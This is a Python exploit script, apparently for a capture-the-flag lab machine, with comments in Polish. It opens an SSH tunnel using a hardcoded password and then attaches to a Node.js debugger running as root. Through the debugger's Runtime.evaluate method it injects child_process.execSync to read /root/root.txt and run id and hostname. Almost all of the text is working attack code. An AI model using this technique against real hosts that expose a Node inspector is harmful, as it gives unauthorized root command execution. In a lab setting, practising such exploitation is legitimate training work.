#!/usr/bin/env python3
"""Root via Node --inspect (uptime-monitor, User=root). Tunel SSH z Kali."""
import json, subprocess, sys, time, urllib.request

IP = "10.129.245.214"
PASS = "reactor1"
LOCAL_PORT = 9229
CMD = (
    "process.mainModule.require('child_process')"
    ".execSync('cat /root/root.txt; id; hostname').toString()"
)

def tunnel():
    subprocess.run(["pkill", "-f", f"{LOCAL_PORT}:127.0.0.1:{LOCAL_PORT}"], stderr=subprocess.DEVNULL)
    subprocess.Popen([
        "sshpass", "-p", PASS, "ssh",
        "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
        "-f", "-N", "-L", f"{LOCAL_PORT}:127.0.0.1:{LOCAL_PORT}",
        f"engineer@{IP}",
    ])
    time.sleep(2.5)

def main():
    try:
        import websocket
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "websocket-client"])
        import websocket

    print("[*] Tunel SSH 9229 -> box (engineer)...")
    tunnel()
    url = f"http://127.0.0.1:{LOCAL_PORT}/json/list"
    print(f"[*] GET {url}")
    tabs = json.load(urllib.request.urlopen(url, timeout=8))
    ws_url = tabs[0]["webSocketDebuggerUrl"]
    print(f"[+] Debugger: {tabs[0].get('title')} user=root (proces)")

    ws = websocket.create_connection(ws_url, timeout=20)
    ws.send(json.dumps({"id": 0, "method": "Runtime.enable"}))
    # drain boot messages
    deadline = time.time() + 3
    while time.time() < deadline:
        try:
            ws.settimeout(0.5)
            ws.recv()
        except Exception:
            break
    ws.settimeout(15)
    ws.send(json.dumps({
        "id": 1, "method": "Runtime.evaluate",
        "params": {"expression": CMD, "returnByValue": True},
    }))
    for _ in range(15):
        raw = ws.recv()
        data = json.loads(raw)
        if data.get("id") == 1:
            val = data.get("result", {}).get("result", {}).get("value")
            if val:
                print("\n[+] OUTPUT (root):\n" + val)
                return 0
            err = data.get("result", {}).get("exceptionDetails")
            if err:
                print("[-] Exception:", err)
                return 1
        if "exceptionDetails" in str(data):
            print("[-]", data)
    print("[-] Brak odpowiedzi evaluate")
    return 1
    ws.close()

if __name__ == "__main__":
    sys.exit(main())
